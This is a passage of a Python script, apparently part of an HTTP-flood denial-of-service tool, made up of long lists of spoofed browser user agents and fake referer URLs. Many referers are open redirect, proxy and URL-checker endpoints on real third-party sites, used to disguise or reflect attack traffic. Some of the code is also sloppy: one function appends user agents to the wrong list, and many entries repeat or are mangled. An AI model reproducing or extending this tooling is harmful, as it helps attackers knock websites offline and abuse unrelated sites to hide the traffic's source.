	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	
	return(headers_useragents)

# generates a referer array
def referer_list():
	global headers_referers
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..')
	headers_referers.append('http://vk.com/profile.php?redirect=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=query?=query=..')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925')
	headers_referers.append('http://yandex.ru/yandsearch?text=')
	headers_referers.append('https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832')
	headers_referers.append('http://go.mail.ru/search?mail.ru=1&q=')
	headers_referers.append('http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..')
	headers_referers.append('http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..')
	headers_referers.append('http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..')
	headers_referers.append('http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..')
	headers_referers.append('http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..')
	headers_referers.append('/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882')
	headers_referers.append('http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..')
	headers_referers.append('http://www.google.ru/url?sa=t&rct=?j&q=&e..')
	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://www.yandex.com/yandsearch?text=')
	headers_referers.append('https://duckduckgo.com/?q=')
	headers_referers.append('http://www.ask.com/web?q=')
	headers_referers.append('http://search.aol.com/aol/search?q=')
	headers_referers.append('https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://host-tracker.com/check_page/?furl=')
	headers_referers.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
	headers_referers.append('http://jigsaw.w3.org/css-validator/validator?uri=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('https://steamcommunity.com/market/search?q=')
	headers_referers.append('http://filehippo.com/search?q=')
	headers_referers.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
	headers_referers.append('http://eu.battle.net/wow/en/search?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://careers.gatesfoundation.org/search?q=')
	headers_referers.append('http://techtv.mit.edu/search?q=')
	headers_referers.append('http://www.ustream.tv/search?q=')
	headers_referers.append('http://www.ted.com/search?q=')
	headers_referers.append('http://funnymama.com/search?q=')
	headers_referers.append('http://itch.io/search?q=')
	headers_referers.append('http://jobs.rbs.com/jobs/search?q=')
	headers_referers.append('http://taginfo.openstreetmap.org/search?q=')
	headers_referers.append('http://www.baoxaydung.com.vn/news/vn/search&q=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.tceq.texas.gov/@@tceq-search?q=')
	headers_referers.append('http://www.reddit.com/search?q=')
	headers_referers.append('http://www.bestbuytheater.com/events/search?q=')
	headers_referers.append('https://careers.carolinashealthcare.org/search?q=')
	headers_referers.append('http://jobs.leidos.com/search?q=')
	headers_referers.append('http://jobs.bloomberg.com/search?q=')
	headers_referers.append('https://www.pinterest.com/search/?q=')
	headers_referers.append('http://millercenter.org/search?q=')
	headers_referers.append('https://www.npmjs.com/search?q=')
	headers_referers.append('http://www.evidence.nhs.uk/search?q=')
	headers_referers.append('http://www.shodanhq.com/search?q=')
	headers_referers.append('http://ytmnd.com/search?q=')
	headers_referers.append('https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=')
	headers_referers.append('https://drive.google.com/viewerng/viewer?url=')
	headers_referers.append('http://www.google.com/translate?u=')
	headers_referers.append('https://developers.google.com/speed/pagespeed/insights/?url=')
	headers_referers.append('http://help.baidu.com/searchResult?keywords=')
	headers_referers.append('http://www.bing.com/search?q=')
	headers_referers.append('https://add.my.yahoo.com/rss?url=')
	headers_referers.append('https://play.google.com/store/search?q=')
	headers_referers.append('http://www.google.com/?q=')
	headers_referers.append('http://www.usatoday.com/search/results?q=')
	headers_referers.append('http://engadget.search.aol.com/search?q=')
	headers_referers.append('http://us.yhs4.search.yahoo.com/yhs/search?p=')
	headers_referers.append('http://www.heatwalkingcycling.org/index.php?pg=')
	headers_referers.append('http://fresno.steinwaydealer.com/index.php?go=')
	headers_referers.append('http://gbs.realwap.net/guest.php/putra.minang/www.klikvsikita.com/putra.minang/www.klikvsikita.com/cpanel.php?id=')
	headers_referers.append('http://www.karplaw.com/index.php?go=')
	headers_referers.append('http://www.veithsymposium.org/index.php?pg=')
	headers_referers.append('http://www.zikgu.info/search.php?go=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.osronline.com/cf.cfm?PageURL=showlists.CFM?list=NTDEVpageurl=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://abcnews.go.com/?page=')
	headers_referers.append('http://www.budogu.jp/cart/syscheck.cgi?url=')
	headers_referers.append('http://www.opensecrets.org/open=')
	headers_referers.append('http://www.titantv.com/account/login.aspx?returnUrl=/Default.aspxreturn=')
	headers_referers.append('http://www.webmd.com/lung/tc/acute-bronchitis-topic-overview?page=')
	headers_referers.append('http://www.benefitmall.com/?TabID=36&emailurl=')
	headers_referers.append('http://www.tolerance.org/?source=redirect&url=teachingtolerance?url=')
	headers_referers.append('http://www.accuride.co.jp/cgi/check.cgi?url=')
	headers_referers.append('http://www.caafcgilsicilia.it/?id_pagina=')
	headers_referers.append('http://www.professioni24.ilsole24ore.com/?page=')
	headers_referers.append('http://italia.virgilio.it/?ckset=force&amp;cityRedirect=falseredirect=')
	headers_referers.append('http://oknabm.ru/index.php?pg=')
	headers_referers.append('http://www.thrombosis2016.org/index.php?go=')
	headers_referers.append('http://www.gotm.net/index.php?go=')
	headers_referers.append('http://webmail.juno.com/?cf=spl&start_page=5&session_redirect=')
	headers_referers.append('http://david.bach.profesores.ie.edu/?profesor=david.bach&pagina=')
	headers_referers.append('http://javier.carrillo.profesores.ie.edu/?profesor=javier.carrillo&pagina=')
	headers_referers.append('http://www.fabrizio.salvador.profesores.ie.edu/?profesor=fabrizio.salvador&pagina=')
	headers_referers.append('http://manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://efernandez-cantelli.profesores.ie.edu/?profesor=efernandez-cantelli&pagina=')
	headers_referers.append('http://www.manuel.becerra.profesores.ie.edu/?profesor=manuel.becerra&pagina=')
	headers_referers.append('http://www.marvin.com/?page=')
	headers_referers.append('http://www.ivrr.de/proxy.php?url=')
	headers_referers.append('http://validator.w3.org/checklink?uri=')
	headers_referers.append('http://www.icap2014.com/cms/sites/all/modules/ckeditor_link/proxy.php?url=')
	headers_referers.append('http://www.rssboard.org/rss-validator/check.cgi?url=')
	headers_referers.append('http://www2.ogs.state.ny.us/help/urlstatusgo.html?url=')
	headers_referers.append('http://prodvigator.bg/redirect.php?url=')
	headers_referers.append('http://validator.w3.org/feed/check.cgi?url=')
	headers_referers.append('http://www.ccm.edu/redirect/goto.asp?myURL=')
	headers_referers.append('http://forum.buffed.de/redirect.php?url=')
	headers_referers.append('http://rissa.kommune.no/engine/redirect.php?url=')
	headers_referers.append('http://www.sadsong.net/redirect.php?url=')
	headers_referers.append('https://www.fvsbank.com/redirect.php?url=')
	headers_referers.append('http://www.jerrywho.de/?s=/redirect.php?url=')
	headers_referers.append('http://www.inow.co.nz/redirect.php?url=')
	headers_referers.append('http://www.automation-drive.com/redirect.php?url=')
	headers_referers.append('http://mytinyfile.com/redirect.php?url=')
	headers_referers.append('http://ruforum.mt5.com/redirect.php?url=')
	headers_referers.append('http://www.websiteperformance.info/redirect.php?url=')
	headers_referers.append('http://www.airberlin.com/site/redirect.php?url=')
	headers_referers.append('http://www.rpz-ekhn.de/mail2date/ServiceCenter/redirect.php?url=')
	headers_referers.append('http://evoec.com/review/redirect.php?url=')
	headers_referers.append('http://www.crystalxp.net/redirect.php?url=')
	headers_referers.append('http://watchmovies.cba.pl/articles/includes/redirect.php?url=')
	headers_referers.append('http://www.seowizard.ir/redirect.php?url=')
	headers_referers.append('http://apke.ru/redirect.php?url=')
	headers_referers.append('http://seodrum.com/redirect.php?url=')
	headers_referers.append('http://redrool.com/redirect.php?url=')
	headers_referers.append('http://blog.eduzones.com/redirect.php?url=')
	headers_referers.append('http://www.onlineseoreportcard.com/redirect.php?url=')
	headers_referers.append('http://www.wickedfire.com/redirect.php?url=')
	headers_referers.append('http://searchtoday.info/redirect.php?url=')
	headers_referers.append('http://www.bobsoccer.ru/redirect.php?url=')
	headers_referers.append('http://newsdiffs.org/article-history/iowaairs.org/redirect.php?url=')
	headers_referers.append('http://www.firmia.cz/redirect.php?url=')
	headers_referers.append('http://palinstravels.co.uk/redirect.php?url=')
	headers_referers.append('http://www.phuketbranches.com/admin/redirect.php?url=')
	headers_referers.append('http://tools.strugacreative.com/redirect.php?url=')
	headers_referers.append('http://www.elec-intro.com/redirect.php?url=')
	headers_referers.append('http://maybeit.net/redirect.php?url=')
	headers_referers.append('http://www.usgpru.net/redirect.php?url=')
	headers_referers.append('http://openwebstuff.com/wp-content/plugins/wp-js-external-link-info/redirect.php?url=')
	headers_referers.append('http://www.webaverage.com/redirect.php?url=')
	headers_referers.append('http://www.seorehash.com/redirect.php?url=')
	headers_referers.append('http://www.seo.khabarsaz.net/redirect.php?url=')
	headers_referers.append('http://www.dimension-marketing.net/outils/seo/audit/redirect.php?url=')
	headers_referers.append('http://www.informeseogratis.com/redirect.php?url=')
	headers_referers.append('http://www.websites-canada.com/redirect.php?url=')
	headers_referers.append('http://zakaztovarov.net/redirect.php?url=')
	headers_referers.append('http://anonymouse.org/cgi-bin/anon-www.cgi/')
	headers_referers.append('http://www.marumura.com/redirect.php?url=')
	headers_referers.append('http://old.leginet.eu/redirect.php?url=')
	headers_referers.append('http://www.am-segelhafen-hotel.com/files/ash_hotel/proxy.php?url=')
	headers_referers.append('http://www.tuangou.do/proxy.php?url=')
	headers_referers.append('http://www.gvpl.ca/url/proxy.php?url=')
	headers_referers.append('http://weiter-lesen.net/web/proxy.php?url=')
	headers_referers.append('http://soroka-vorovka.com/proxy/proxy.php?url=')
	headers_referers.append('http://www.cogsci.ed.ac.uk/~richard/xml-check.cgi?url=')
	headers_referers.append('http://pro.athealth.co.jp/cgi-bin/pro/check.cgi?url=')
	headers_referers.append('http://ukrhome.net/go.php?url=')
	headers_referers.append('http://www.aliancaandroid.com/go.php?url=')
	headers_referers.append('http://www.hangglider.kiev.ua/go.php?url=')
	headers_referers.append('http://it4pal.com/ar/go.php?url=')
	headers_referers.append('http://paperplane.su/go.php?url=')
	headers_referers.append('http://www.education.net.au/go.php?url=')
	headers_referers.append('http://www.bloggerexp.com/go.php?url=')
	headers_referers.append('http://www.lifetype.ru/go.php?url=')
	headers_referers.append('http://blogerator.ru/go.php?url=')
	headers_referers.append('http://www.hella.ru/go.php?url=')
	headers_referers.append('http://fcmanutd.com/go.php?url=')
	headers_referers.append('http://www.sitysoft.com/go.php?url=')
	headers_referers.append('https://www.google.com/interstitial?url=')
	headers_referers.append('http://www.flashreport.org/blog/go.php?url=')
	headers_referers.append('http://www.otworld.de/go.php?url=')
	headers_referers.append('http://www.ennk.ru/go.php?url=')
	headers_referers.append('http://www.xoxohth.com/go.php?url=')
	headers_referers.append('http://dochtm.com/go.php?url=')
	headers_referers.append('http://www.autoadmit.com/go.php?url=')
	headers_referers.append('http://www.vttour.fr/actu/go.php?url=')
	headers_referers.append('http://www.geodream.ru/go.php?url=')
	headers_referers.append('http://jp.trefoil.tv/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://baanna.net/go.php?url=')
	headers_referers.append('http://www.morningcoffee.co.kr/go.php?url=')
	headers_referers.append('http://www.roetti.de/Oststammtisch-Forum/Forum/go.php?url=')
	headers_referers.append('http://irc.ifmo.ru/go.php?url=')
	headers_referers.append('http://www.webchirkut.com/go.php?url=')
	headers_referers.append('http://www.parkcity.org/redirect.aspx?url=')
	headers_referers.append('http://hao.zw51.cn/go.php?url=')
	headers_referers.append('http://dmoz.by/go.php?url=')
